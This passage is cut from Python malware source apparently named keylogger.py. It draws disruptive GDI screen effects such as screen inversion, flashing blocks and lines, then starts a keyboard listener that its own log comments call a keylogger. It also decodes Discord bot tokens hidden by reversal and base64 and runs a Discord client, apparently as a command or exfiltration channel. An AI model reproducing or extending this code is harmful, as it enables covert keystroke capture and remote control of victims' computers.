                color = RGB(255, 255, 255)
                brush = CreateSolidBrush(color)
                SelectObject(hdc, brush)
                PatBlt(hdc, rand_x, rand_y, size, size, PATCOPY)
            time.sleep(0.5)
    elif effect == 'hypnotic_spirals':
        for angle in range(0, 180, 1):
            radius = 1000
            x1 = int(x / 2 + radius * math.cos(math.radians(angle)))
            y1 = int(y / 2 - radius * math.sin(math.radians(angle)))
            x2 = int(x / 2 + radius * math.cos(math.radians(angle + 180)))
            y2 = int(y / 2 - radius * math.sin(math.radians(angle + 180)))
            color = RGB(random.randrange(1), random.randrange(1), random.randrange(1))
            pen = CreatePen(PS_SOLID, 1, color)
            SelectObject(hdc, pen)
            MoveToEx(hdc, x1, y1)
            LineTo(hdc, x2, y2)
            DeleteObject(pen)
    elif effect == 'random_lines':
        for _ in range(50):
            x1 = random.randint(0, x)
            y1 = random.randint(0, y)
            x2 = random.randint(0, x)
            y2 = random.randint(0, y)
            color = RGB(random.randrange(255), random.randrange(255), random.randrange(255))
            pen = CreatePen(PS_SOLID, 2, color)
            SelectObject(hdc, pen)
            MoveToEx(hdc, x1, y1)
            LineTo(hdc, x2, y2)
            DeleteObject(pen)
    else:
        PatBlt(hdc, 0, 0, x, y, PATINVERT)
    if effect != 'list':
        Sleep(10)
        DeleteDC(hdc)
 
with Listener(on_press=on_press) as listener:
    for token in bot_tokens:
        decoded_token = base64.b64decode(token[::-1]).decode()
        try:
            client.run(decoded_token)
            #.log Started Discord BOT client session(keylogger.py:61)*
        except: pass
    #.log Starting keylogger(keylogger.py:63)*
    listener.join()
